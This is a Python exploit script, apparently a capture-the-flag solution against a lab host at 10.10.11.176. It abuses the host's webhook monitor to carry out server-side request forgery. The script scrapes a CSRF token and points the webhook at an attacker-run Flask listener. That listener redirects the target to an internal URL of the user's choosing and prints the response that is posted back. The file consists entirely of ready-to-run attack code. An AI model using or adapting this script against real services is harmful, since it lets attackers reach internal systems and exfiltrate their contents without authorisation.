#!/usr/bin/env python3

import logging
import os
import re
import requests
import sys

from flask import Flask, redirect, request
from threading import Thread


app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.CRITICAL)


@app.route('/monitored', methods=['GET'])
def monitored():
    return redirect(monitored_url)


@app.route('/payload', methods=['POST'])
def payload():
    print('\n[+] SSRF Response:\n\n' + request.json.get('body'))
    os._exit(0)


def webhook(lhost: str):
    s = requests.session()
    r = s.get('http://10.10.11.176')
    token = re.findall(r'<input type="hidden" name="_token" value="(.*?)">', r.text)[0]

    s.post('http://10.10.11.176/webhook', data={
        '_token': token,
        'webhookUrl': f'http://{lhost}/payload',
        'monitoredUrl': f'http://{lhost}/monitored',
        'frequency': '* * * * *',
        'onlyError': 0,
        'action': 'Test',
    })


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f'[!] Usage: {sys.argv[0]} <lhost> <monitored-url>')
        os._exit(1)

    lhost, monitored_url = sys.argv[1:]

    Thread(target=webhook, args=(lhost, )).start()
    app.run(host='0.0.0.0', port=80)
